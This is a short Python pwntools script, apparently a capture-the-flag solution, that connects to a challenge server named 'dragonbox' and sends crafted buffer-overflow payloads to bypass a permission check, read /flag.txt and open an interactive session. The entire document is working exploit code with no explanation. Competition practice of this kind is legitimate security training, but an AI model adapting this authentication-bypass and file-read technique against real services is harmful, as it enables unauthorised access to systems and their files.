from pwn import *

HOST = "dragonbox.hackable.software"
PORT = 28033

r = remote(HOST,PORT)
s = remote(HOST,PORT)
path = b"/flag.txt"
r.send(b":"+b"a"*0x100+b"\x0f"+b"\x00"*0xfe)
r.send(b"1")
r.send(p32(len(path)))
r.send(path)
r.recvuntil(b"permission denied")
s.send(b":"+b"a"*0x100+b"\x00"*0xff)
s.recvuntil(b"Welcome")
k = remote(HOST,PORT)
g = remote(HOST,PORT)
g.send(b"default:default")
g.sendafter(b"Welcome!",b"1")
g.send(p32(len(path)))
g.send(path)
g.send(p32(3))
g.send(b"yes")
print(g.recvrepeat(3))
g.interactive()
